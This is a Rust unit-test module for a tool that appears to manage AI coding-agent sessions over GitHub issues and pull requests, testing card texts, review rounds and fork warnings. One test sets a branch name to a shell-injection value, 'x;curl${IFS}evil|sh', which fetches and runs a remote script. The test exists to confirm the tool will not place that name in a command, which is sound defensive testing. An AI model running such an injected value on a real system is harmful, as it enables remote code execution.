        assert_eq!(note.text.as_ref(), "2 decision points · decide here or on the issue");
        assert!(note.action == Some(CardAction::Decide));
        let unknown = decision_note(None, Some("maui1911"), false, ItemKind::Issue);
        assert_eq!(unknown.text.as_ref(), "Decision points posted · answer on the issue");
        assert!(unknown.action.is_none());
    }

    #[test]
    fn an_answer_names_who_gave_it_and_what_was_chosen() {
        let mut discussion = Discussion {
            points: vec![point("B1"), point("B2")],
            answers: vec![answer("Maui1911", &[("B1", 'B'), ("B2", 'A')])],
        };
        let mine = decision_note(Some(&discussion), Some("maui1911"), false, ItemKind::Issue);
        assert_eq!(mine.text.as_ref(), "Answered by you: B1 B, B2 A · move it to Ready");
        assert!(mine.action.is_none());
        let readied = decision_note(Some(&discussion), Some("maui1911"), true, ItemKind::Issue);
        assert_eq!(readied.text.as_ref(), "Answered by you: B1 B, B2 A · implementation starts");
        discussion.answers.push(answer("sanne", &[]));
        let theirs = decision_note(Some(&discussion), Some("maui1911"), false, ItemKind::Issue);
        assert_eq!(theirs.text.as_ref(), "Answered by @sanne: B1 B, B2 A · move it to Ready");
    }

    #[test]
    fn a_repair_s_card_says_what_it_repairs_and_when_it_needs_you() {
        let card = |note| {
            let card = repair_card(note);
            (card.text.to_string(), card.tone)
        };
        assert!(
            card(RepairNote::Running(FaultKind::Checks, 1))
                == ("Repairing failed checks · 1 of 2".into(), NoteTone::Working)
        );
        assert!(
            card(RepairNote::Running(FaultKind::Conflict, 2))
                == ("Resolving a conflict with its base · 2 of 2".into(), NoteTone::Working)
        );
        assert!(
            card(RepairNote::Running(FaultKind::Behind, 1))
                == ("Catching up with its base · 1 of 2".into(), NoteTone::Working)
        );
        assert!(
            card(RepairNote::Waits(FaultKind::Checks))
                == ("Checks failed · the repair waits for its session".into(), NoteTone::Waiting)
        );
        assert!(
            card(RepairNote::Stopped(FaultKind::Checks))
                == (
                    "The repair stopped without a push · see its session".into(),
                    NoteTone::NeedsYou
                )
        );
        assert!(
            card(RepairNote::GaveUp(FaultKind::Conflict))
                == (
                    "It conflicts with its base after 2 repairs · it needs you".into(),
                    NoteTone::NeedsYou
                )
        );
    }

    #[test]
    fn a_handover_stopped_short_only_when_a_read_after_its_stop_saw_it_still_open() {
        let stop = Instant::now();
        let later = stop + Duration::from_secs(5);
        let follow = |worked, stopped_at| HandoverFollow {
            worked,
            stopped_at,
            ..HandoverFollow::default()
        };
        assert!(follow(true, None).session(true, true, Some(stop)) == HandoverSession::Busy);
        assert!(
            follow(true, Some(stop)).session(false, true, Some(later)) == HandoverSession::Stopped
        );
        assert!(
            follow(true, Some(later)).session(false, true, Some(stop)) == HandoverSession::Idle,
            "no read since it stopped"
        );
        assert!(
            follow(false, Some(stop)).session(false, true, Some(later)) == HandoverSession::Idle,
            "it hasn't worked on the handover yet"
        );
        assert!(
            follow(true, Some(stop)).session(false, false, Some(later)) == HandoverSession::Idle,
            "what was handed over is done"
        );
    }

    #[test]
    fn a_handover_is_worked_on_once_a_prompt_follows_it_or_this_run_did_not_start_it() {
        let at = "2026-11-27T10:00:00Z".to_string();
        let mut follow = HandoverFollow::default();
        follow.start(at.clone(), Some(3));
        follow.look(Some(at.clone()), false, Some(3));
        assert!(!follow.worked, "typed, not taken yet");
        assert!(follow.stopped_at.is_some());
        follow.look(Some(at.clone()), false, Some(4));
        assert!(follow.worked, "a prompt went by between two looks");
        follow.look(Some(at), true, Some(4));
        assert!(follow.stopped_at.is_none());
        let mut restarted = HandoverFollow::default();
        restarted.look(Some("2026-11-27T09:00:00Z".into()), false, Some(7));
        assert!(restarted.worked);
    }

    #[test]
    fn a_forwarded_comment_s_card_says_who_commented_and_where_it_stands() {
        let card = |note: ForwardNote| {
            let watch = PullRequestWatch {
                forward_note: Some(note),
                ..PullRequestWatch::default()
            };
            let card = forward_card(&watch).unwrap();
            (card.text.to_string(), card.tone)
        };
        let sanne = || vec!["sanne".to_string()];
        assert!(
            card(ForwardNote::Working(sanne()))
                == ("@sanne commented · handed to its session".into(), NoteTone::Working)
        );
        assert!(
            card(ForwardNote::Waits(vec!["sanne".into(), "piet".into()]))
                == ("@sanne and @piet commented · waits for its session".into(), NoteTone::Waiting)
        );
        assert!(
            card(ForwardNote::Stopped(vec!["a".into(), "b".into(), "c".into()]))
                == (
                    "@a, @b and @c commented · its session stopped without a push or a reply"
                        .into(),
                    NoteTone::NeedsYou
                )
        );
        assert!(card(ForwardNote::Posting) == ("Posting the reply…".into(), NoteTone::Working));
        let failed = PullRequestWatch {
            forward_note: Some(ForwardNote::Posting),
            forward_post_error: Some((Instant::now(), "HTTP 502".into())),
            ..PullRequestWatch::default()
        };
        let text = forward_card(&failed).unwrap().text;
        assert_eq!(text.as_ref(), "Couldn't post the reply: HTTP 502");
        let broken = PullRequestWatch {
            forward_note: Some(ForwardNote::FixReply),
            reply_reminder: Some(Reminder {
                problems: "a code block is not closed".into(),
                ..Reminder::default()
            }),
            ..PullRequestWatch::default()
        };
        let text = forward_card(&broken).unwrap().text;
        assert_eq!(text.as_ref(), "Reply incomplete: a code block is not closed");
    }

    #[test]
    fn a_waiting_comment_leaves_the_card_to_a_repair() {
        let waits = || Some(ForwardNote::Waits(vec!["sanne".into()]));
        let text = |watch: &PullRequestWatch| handover_card(watch).unwrap().text.to_string();
        let repairing = PullRequestWatch {
            forward_note: waits(),
            repair_note: Some(RepairNote::Running(FaultKind::Checks, 1)),
            ..PullRequestWatch::default()
        };
        assert_eq!(text(&repairing), "Repairing failed checks · 1 of 2");
        let waiting = PullRequestWatch {
            forward_note: waits(),
            ..PullRequestWatch::default()
        };
        assert_eq!(text(&waiting), "@sanne commented · waits for its session");
        let handed = PullRequestWatch {
            forward_note: Some(ForwardNote::Working(vec!["sanne".into()])),
            repair_note: Some(RepairNote::Stopped(FaultKind::Checks)),
            ..PullRequestWatch::default()
        };
        assert_eq!(text(&handed), "@sanne commented · handed to its session");
    }

    #[test]
    fn a_fork_s_card_offers_to_start_it() {
        let note = hold_note(&Hold::FromFork);
        assert!(note.tone == NoteTone::NeedsYou);
        assert!(note.action == Some(CardAction::StartFromFork));
        let other = hold_note(&Hold::NoMove);
        assert!(other.tone == NoteTone::Waiting && other.action.is_none());
    }

    #[test]
    fn starting_a_fork_s_pull_request_warns_what_its_branch_can_do() {
        let head = PullRequestHead {
            branch: "main".into(),
            is_cross_repository: true,
            repository: Some("octo/CodeScope".into()),
            maintainer_can_modify: true,
        };
        let (title, message, detail) = fork_warning(421, &head);
        assert_eq!(title, "Start #421 from a fork?");
        assert!(message.starts_with("Its branch comes from octo/CodeScope."), "{message}");
        assert!(message.contains("CLAUDE.md"), "{message}");
        assert!(message.contains("can run commands on this computer"), "{message}");
        assert_eq!(
            detail,
            "Its author allows edits by maintainers, so the agent can push to main in \
             octo/CodeScope."
        );
        let closed = PullRequestHead {
            maintainer_can_modify: false,
            ..head.clone()
        };
        assert_eq!(
            fork_warning(421, &closed).2,
            "Its author doesn't allow edits by maintainers, so the round can only reply."
        );
        let gone = PullRequestHead {
            repository: None,
            ..head
        };
        let (_, message, detail) = fork_warning(421, &gone);
        assert!(message.starts_with("Its branch comes from a fork that is gone."), "{message}");
        assert_eq!(detail, "Its fork is gone, so the round can only reply.");
        let odd = PullRequestHead {
            branch: "x;curl${IFS}evil|sh".into(),
            ..closed
        };
        assert_eq!(
            fork_warning(421, &PullRequestHead { maintainer_can_modify: true, ..odd }).2,
            "Its branch name has characters CodeScope doesn't put in a command, so the round \
             can only reply."
        );
    }

    #[test]
    fn decision_points_on_a_pull_request_item_are_answered_there() {
        let item = ItemKind::PullRequest;
        let mut discussion = Discussion {
            points: vec![point("B1"), point("B2")],
            answers: Vec::new(),
        };
        let note = decision_note(Some(&discussion), Some("maui1911"), false, item);
        assert_eq!(note.text.as_ref(), "2 decision points · decide here or on the pull request");
        let unknown = decision_note(None, Some("maui1911"), false, item);
        assert_eq!(unknown.text.as_ref(), "Decision points posted · answer on the pull request");
        discussion.answers.push(answer("Maui1911", &[("B1", 'B')]));
        let readied = decision_note(Some(&discussion), Some("maui1911"), true, item);
        assert_eq!(readied.text.as_ref(), "Answered by you: B1 B · a review starts");
    }

    #[test]
    fn the_findings_toast_says_what_comes_next_for_the_item() {
        let next = findings_next_step;
        assert_eq!(
            next(Outcome::Findings, ItemKind::Issue),
            "Move the item to Ready to implement it."
        );
        assert_eq!(
            next(Outcome::Findings, ItemKind::PullRequest),
            "Move the item to Ready for a review round."
        );
        assert_eq!(
            next(Outcome::DecisionPoints, ItemKind::Issue),
            "Answer the decision points on the issue."
        );
        assert_eq!(
            next(Outcome::DecisionPoints, ItemKind::PullRequest),
            "Answer the decision points on the pull request."
        );
    }

    fn open_pull_request(number: u32, is_draft: bool, checks: Checks) -> PullRequest {
        PullRequest {
            id: format!("PR_{number}"),
            number,
            url: format!("https://github.com/maui1911/CodeScope/pull/{number}"),
            state: PullRequestState::Open,
            is_draft,
            checks,
            head_oid: format!("c{number}"),
            health: Default::default(),
            comments: Vec::new(),
        }
    }

    fn posted(number: u32) -> PostedPullRequest {
        PostedPullRequest {
            number,
            url: "u".into(),
            comment_url: "c".into(),
            in_review: false,
            reported_at: None,
        }
    }

    fn record_with(pull_request: Option<PostedPullRequest>) -> WorktreeDispatch {
        WorktreeDispatch {
            board_url: "https://github.com/users/maui1911/projects/1".into(),
            item_id: "PVTI_1".into(),
            content_id: "I_1".into(),
            kind: ItemKind::Issue,
            repository: "maui1911/CodeScope".into(),
            number: 426,
            title: "Review round".into(),
            url: "https://github.com/maui1911/CodeScope/issues/426".into(),
            round: Round::Implementation,
            trigger_at: "2026-11-25T09:00:00Z".into(),
            findings: None,
            pull_request,
            review: None,
            fork: None,
            repair: None,
            forwarded: None,
            kept: None,
            linked_at: None,
        }
    }

    #[test]
    fn a_draft_needs_testing_by_hand_and_offers_ready_for_review() {
        let watch = PullRequestWatch {
            pull_request: Some(open_pull_request(415, true, Checks::Running)),
            read_ok_at: Some(Instant::now()),
            ..PullRequestWatch::default()
        };
        let note = pull_request_note(&watch, Some(&posted(415)), ItemKind::Issue).unwrap();
        assert_eq!(note.text.as_ref(), "Draft PR #415 · test by hand");
        assert!(note.tone == NoteTone::NeedsYou);
        assert!(note.action == Some(CardAction::ReadyForReview));
    }

    #[test]
    fn a_draft_pull_request_item_waits_to_be_marked_ready() {
        let watch = PullRequestWatch {
            pull_request: Some(open_pull_request(420, true, Checks::Running)),
            read_ok_at: Some(Instant::now()),
            ..PullRequestWatch::default()
        };
        let note = pull_request_note(&watch, Some(&posted(420)), ItemKind::PullRequest).unwrap();
        assert_eq!(note.text.as_ref(), "Draft PR #420 · moves to In review once marked ready");
        assert!(note.tone == NoteTone::Waiting);
        assert!(note.action == Some(CardAction::ReadyForReview));
    }

    #[test]
    fn a_ready_pull_request_shows_its_checks_and_red_ones_as_failed() {
        let mut watch = PullRequestWatch {
            pull_request: Some(open_pull_request(415, false, Checks::Passing)),
            read_ok_at: Some(Instant::now()),
            ..PullRequestWatch::default()
        };
        let note = pull_request_note(&watch, Some(&posted(415)), ItemKind::Issue).unwrap();
        assert_eq!(note.text.as_ref(), "PR #415 · checks passing");
        assert!(note.tone == NoteTone::Waiting && note.action.is_none());
        watch.pull_request = Some(open_pull_request(415, false, Checks::Failing));
        let note = pull_request_note(&watch, Some(&posted(415)), ItemKind::Issue).unwrap();
        assert_eq!(note.text.as_ref(), "PR #415 · checks failing");
        assert!(note.tone == NoteTone::Failed);
    }

    #[test]
    fn a_session_that_worked_and_stopped_without_a_pull_request_waits_for_you() {
        let mut watch = PullRequestWatch::default();
        watch.track(Some((SessionState::Idle, 3)));
        watch.read_ok_at = Some(Instant::now());
        assert!(!watch.waits_for_you(), "it never worked while watched");
        watch.track(Some((SessionState::Busy, 4)));
        watch.track(Some((SessionState::Idle, 4)));
        let stopped = watch.idle_since.unwrap();
        watch.read_ok_at = Some(stopped - Duration::from_millis(1));
        assert!(!watch.waits_for_you(), "no read since it stopped");
        watch.read_ok_at = Some(stopped + Duration::from_millis(1));
        assert!(watch.waits_for_you());
        let note = pull_request_note(&watch, None, ItemKind::Issue).unwrap();
        assert_eq!(note.text.as_ref(), "Waiting for you in the tab");
        assert!(note.tone == NoteTone::NeedsYou);
        watch.track(None);
        assert!(!watch.waits_for_you(), "the tab is closed");
    }

    #[test]
    fn a_handover_waits_for_a_read_that_started_after_the_session_stopped() {
        let mut watch = PullRequestWatch::default();
        assert!(watch.read_after_stop(), "no tab, so nothing that can push and stop");
        watch.read_ok_at = Some(Instant::now());
        watch.track(Some((SessionState::Busy, 4)));
        watch.track(Some((SessionState::Idle, 4)));
        let stopped = watch.idle_since.unwrap();
        watch.read_ok_at = Some(stopped - Duration::from_millis(1));
        assert!(!watch.read_after_stop(), "the read may predate a push before the stop");
        watch.read_ok_at = Some(stopped + Duration::from_millis(1));
        assert!(watch.read_after_stop());
        watch.read_ok_at = None;
        assert!(!watch.read_after_stop(), "never read");
    }

    #[test]
    fn a_stop_reads_the_pull_request_again_at_once() {
        let mut watch = PullRequestWatch::default();
        assert!(watch.read_due(Some(ColumnRole::InProgress), false));
        assert!(!watch.read_due(Some(ColumnRole::Done), false), "no open pull request to follow");
        watch.read_at = Some(Instant::now() - Duration::from_secs(1));
        assert!(!watch.read_due(Some(ColumnRole::InProgress), false));
        watch.track(Some((SessionState::Busy, 4)));
        watch.track(Some((SessionState::Idle, 4)));
        assert!(watch.read_due(Some(ColumnRole::InProgress), false));
        watch.reading = true;
        assert!(!watch.read_due(Some(ColumnRole::InProgress), false));
    }

    #[test]
    fn a_reported_pull_request_is_read_once_wherever_the_item_is() {
        let mut watch = PullRequestWatch::default();
        assert!(!watch.read_due(Some(ColumnRole::Ready), false));
        assert!(watch.read_due(Some(ColumnRole::Ready), true));
        watch.read_at = Some(Instant::now() - PULL_REQUEST_READ_EVERY);
        assert!(watch.read_due(Some(ColumnRole::Ready), true), "the last read failed");
        watch.read_ok_at = watch.read_at;
        assert!(!watch.read_due(Some(ColumnRole::Ready), true), "read, and found it closed");
        watch.pull_request = Some(open_pull_request(9, false, Checks::Passing));
        assert!(watch.read_due(Some(ColumnRole::Ready), true), "open, so followed every 30 s");
    }

    #[test]
    fn ready_reviews_only_a_pull_request_a_read_found_open() {
        let mut watch = PullRequestWatch::default();
        assert_eq!(watch.own_pull_request(false), OwnPullRequest::NotOpened);
        assert_eq!(watch.own_pull_request(true), OwnPullRequest::Unread);
        let reported = record_with(Some(posted(9)));
        assert_eq!(own_pull_request(Some(&reported), None), OwnPullRequest::Unread);
        assert_eq!(own_pull_request(Some(&record_with(None)), None), OwnPullRequest::NotOpened);
        assert_eq!(own_pull_request(None, None), OwnPullRequest::NotOpened);
        watch.read_ok_at = Some(Instant::now());
        assert_eq!(watch.own_pull_request(true), OwnPullRequest::Closed);
        watch.pull_request = Some(PullRequest {
            state: PullRequestState::Merged,
            ..open_pull_request(9, false, Checks::Passing)
        });
        assert_eq!(watch.own_pull_request(true), OwnPullRequest::Closed);
        watch.pull_request = Some(open_pull_request(9, true, Checks::Running));
        assert_eq!(watch.own_pull_request(true), OwnPullRequest::Open);
        watch.reported = Some(posted(9));
        let record = record_with(None);
        assert_eq!(own_pull_request(Some(&record), Some(&watch)), OwnPullRequest::Open);
    }

    #[test]
    fn a_new_round_forgets_the_session_but_keeps_the_pull_request() {
        let mut watch = PullRequestWatch::default();
        watch.follow("2026-11-25T09:00:00Z", true);
        watch.track(Some((SessionState::Busy, 4)));
        watch.track(Some((SessionState::Idle, 5)));
        watch.read_ok_at = Some(Instant::now());
        watch.pull_request = Some(open_pull_request(9, false, Checks::Passing));
        watch.follow("2026-11-25T09:00:00Z", true);
        assert!(watch.busy_seen, "the same round");
        watch.follow("2026-11-26T10:00:00Z", true);
        assert!(!watch.busy_seen);
        assert_eq!(watch.idle_since, None);
        assert_eq!(watch.turns, None);
        assert!(watch.read_ok_at.is_some());
        assert_eq!(watch.pull_request.as_ref().map(|pr| pr.number), Some(9));
    }

    #[test]
    fn a_round_from_before_a_restart_counts_as_having_worked() {
        let mut watch = PullRequestWatch::default();
        watch.follow("2026-11-25T09:00:00Z", false);
        assert!(watch.busy_seen);
        watch.track(Some((SessionState::Idle, 5)));
        let stopped = watch.idle_since.unwrap();
        watch.read_ok_at = Some(stopped + Duration::from_millis(1));
        assert!(watch.stopped_after_work());
    }

    #[test]
    fn a_new_round_carries_the_pull_request_unless_it_implements_anew() {
        let reported = || Some(posted(9));
        let open = open_pull_request(9, false, Checks::Passing);
        assert_eq!(carried_pull_request(Round::Implementation, reported(), Some(&open)), None);
        let research = carried_pull_request(Round::Research, reported(), None).unwrap();
        assert_eq!((research.number, research.in_review), (9, false));
        let review = carried_pull_request(Round::Review, reported(), Some(&open)).unwrap();
        assert_eq!(review, posted(9));
        let newer = open_pull_request(12, false, Checks::Passing);
        let review = carried_pull_request(Round::Review, reported(), Some(&newer)).unwrap();
        assert_eq!((review.number, review.url.as_str()), (12, newer.url.as_str()));
        assert_eq!(review.comment_url, "c");
        assert_eq!(carried_pull_request(Round::Review, None, Some(&open)), None);
    }

    #[test]
    fn a_turn_between_two_looks_counts_as_work_and_as_a_new_stop() {
        let mut watch = PullRequestWatch::default();
        watch.track(Some((SessionState::Idle, 63)));
        let first = watch.idle_since;
        watch.track(Some((SessionState::Idle, 63)));
        assert!(!watch.busy_seen);
        assert_eq!(watch.idle_since, first);
        std::thread::sleep(Duration::from_millis(2));
        watch.track(Some((SessionState::Idle, 64)));
        assert!(watch.busy_seen);
        assert!(watch.idle_since > first);
    }

    fn review_from(start_head: &str) -> ReviewRound {
        ReviewRound {
            start_head: Some(start_head.into()),
            ..ReviewRound::default()
        }
    }

    const STOPPED: ReviewSession = ReviewSession::Claude {
        stopped_after_work: true,
        stop_checked: false,
    };

    fn end(reply: Option<&str>, check_threads: bool) -> ReviewStep {
        ReviewStep::End {
            reply: reply.map(Into::into),
            check_threads,
        }
    }

    #[test]
    fn a_review_round_ends_once_its_stopped_session_pushed_or_wrote_a_reply() {
        let pr = open_pull_request(415, false, Checks::Passing);
        assert_eq!(review_step(&pr, &review_from("c1"), None, STOPPED), end(None, false));
        let reply = Some(Ok(Some("Kept it.".to_string())));
        let step = review_step(&pr, &review_from("c415"), reply, STOPPED);
        assert_eq!(step, end(Some("Kept it."), false));
    }

    #[test]
    fn without_a_push_or_a_reply_each_stop_is_checked_once_for_thread_replies() {
        let pr = open_pull_request(415, false, Checks::Passing);
        let unpushed = review_from("c415");
        assert_eq!(review_step(&pr, &unpushed, None, STOPPED), end(None, true));
        let blank = Some(Ok(None));
        assert_eq!(review_step(&pr, &unpushed, blank, STOPPED), end(None, true), "blank");
        let no_head = ReviewRound::default();
        assert_eq!(review_step(&pr, &no_head, None, STOPPED), end(None, true), "no push to see");
        let checked = ReviewSession::Claude {
            stopped_after_work: true,
            stop_checked: true,
        };
        assert_eq!(review_step(&pr, &unpushed, None, checked), ReviewStep::Wait);
    }

    #[test]
    fn a_review_round_waits_for_its_session_to_work_and_stop() {
        let pr = open_pull_request(415, false, Checks::Passing);
        let pushed = review_from("c1");
        let not_yet_at_work = ReviewSession::Claude {
            stopped_after_work: false,
            stop_checked: false,
        };
        for session in [ReviewSession::Working, not_yet_at_work] {
            assert_eq!(review_step(&pr, &pushed, None, session), ReviewStep::Wait);
        }
        let held = ReviewSession::Held(HeldBy::Program);
        assert_eq!(review_step(&pr, &pushed, None, held), ReviewStep::Held(HeldBy::Program));
        let unpushed = review_from("c415");
        assert_eq!(review_step(&pr, &unpushed, None, held), ReviewStep::Wait, "nothing to report");
    }

    #[test]
    fn another_agents_review_round_ends_on_a_push_or_reply_once_its_tab_settles() {
        let pr = open_pull_request(415, false, Checks::Passing);
        let settled = ReviewSession::Settled {
            stop_checked: false,
        };
        assert_eq!(review_step(&pr, &review_from("c1"), None, settled), end(None, false));
        let unpushed = review_from("c415");
        assert_eq!(review_step(&pr, &unpushed, None, settled), end(None, true), "thread replies");
        let checked = ReviewSession::Settled { stop_checked: true };
        assert_eq!(review_step(&pr, &unpushed, None, checked), ReviewStep::Wait);
    }

    #[test]
    fn a_settled_tab_is_a_stop_of_its_own() {
        let mut watch = PullRequestWatch {
            settled_since: Some(Instant::now()),
            ..PullRequestWatch::default()
        };
        assert_eq!(watch.review_stop(), watch.settled_since);
        watch.stop_without_result = watch.settled_since;
        assert!(watch.stopped_without_result());
        watch.settled_since = None;
        assert!(!watch.stopped_without_result());
    }

    #[test]
    fn a_reply_to_fix_holds_the_end_and_a_posted_one_is_not_read_again() {
        let pr = open_pull_request(415, false, Checks::Passing);
        let broken = || Some(Err(vec![Problem::OpenFence]));
        let step = review_step(&pr, &review_from("c1"), broken(), STOPPED);
        assert_eq!(step, ReviewStep::FixReply(vec![Problem::OpenFence]));
        let replied = ReviewRound {
            reply_url: Some("r".into()),
            ..review_from("c415")
        };
        assert_eq!(review_step(&pr, &replied, broken(), STOPPED), end(None, false));
    }

    #[test]
    fn a_review_rounds_card_says_what_holds_it_until_the_pull_request_is_reported() {
        let mut watch = PullRequestWatch {
            pull_request: Some(open_pull_request(415, false, Checks::Passing)),
            read_ok_at: Some(Instant::now()),
            ..PullRequestWatch::default()
        };
        let review = review_from("c415");
        let own_line = review_note(&watch, &review, None, ItemKind::Issue);
        assert!(own_line.is_none(), "the round's own line");
        watch.review_held = Some(HeldBy::Program);
        let note = review_note(&watch, &review, None, ItemKind::Issue).unwrap();
        assert_eq!(
            note.text.as_ref(),
            "Review answered · to report it, quit what runs in its worktree's tab, or close the tab"
        );
        watch.review_held = None;
        let stop = Instant::now();
        watch.idle_since = Some(stop);
        watch.stop_without_result = Some(stop);
        let note = review_note(&watch, &review, None, ItemKind::Issue).unwrap();
        assert_eq!(
            note.text.as_ref(),
            "Review stopped without a push or a reply · waiting for you in the tab"
        );
        assert!(note.tone == NoteTone::NeedsYou);
        watch.reply_reminder = Some(Reminder {
            problems: "a code block is not closed".into(),
            ..Reminder::default()
        });
        let note = review_note(&watch, &review, None, ItemKind::Issue).unwrap();
        assert_eq!(note.text.as_ref(), "Reply incomplete: a code block is not closed");
        assert!(note.tone == NoteTone::Failed);
        watch.ending_review = true;
        let note = review_note(&watch, &review, None, ItemKind::Issue).unwrap();
        assert_eq!(note.text.as_ref(), "Reporting the review…");
        watch.ending_review = false;
        watch.reply_reminder = None;
        let reported = ReviewRound {
            report_url: Some("c".into()),
            ..review
        };
        let note = review_note(&watch, &reported, Some(&posted(415)), ItemKind::Issue).unwrap();
        assert_eq!(note.text.as_ref(), "PR #415 · checks passing");
    }

    #[test]
    fn a_new_stop_clears_the_finding_that_the_last_one_left_nothing() {
        let mut watch = PullRequestWatch::default();
        watch.track(Some((SessionState::Busy, 4)));
        watch.track(Some((SessionState::Idle, 4)));
        watch.stop_without_result = watch.idle_since;
        assert!(watch.stopped_without_result());
        watch.track(Some((SessionState::Busy, 5)));
        assert!(!watch.stopped_without_result());
    }

    #[test]
    fn the_review_round_on_record_takes_what_only_memory_kept() {
        let mut record = record_with(Some(posted(415)));
        record.review = Some(review_from("c1"));
        let watch = PullRequestWatch {
            review_reply_url: Some("reply".into()),
            review_report_url: Some("report".into()),
            ..PullRequestWatch::default()
        };
        let review = review_round(&record, &watch);
        assert_eq!(review.start_head.as_deref(), Some("c1"));
        assert_eq!(review.reply_url.as_deref(), Some("reply"));
        assert_eq!(review.report_url.as_deref(), Some("report"));
        record.review = None;
        assert_eq!(review_round(&record, &PullRequestWatch::default()), ReviewRound::default());
    }

    #[test]
    fn a_reminder_goes_out_once_per_version_of_the_file_and_three_times_at_most() {
        let mut reminder = Reminder::default();
        let stamp = |n: u64| (None, n);
        assert!(!reminder.note(&[Problem::OpenFence], stamp(1), false), "no way to tell it");
        assert_eq!(reminder.problems, "a code block is not closed");
        assert!(reminder.note(&[Problem::OpenFence], stamp(1), true));
        assert!(!reminder.note(&[Problem::OpenFence], stamp(1), true), "told about this one");
        assert!(reminder.note(&[Problem::OpenFence], stamp(2), true));
        assert!(reminder.note(&[Problem::OpenFence], stamp(3), true));
        assert!(!reminder.note(&[Problem::OpenFence], stamp(4), true), "three is enough");
    }
}
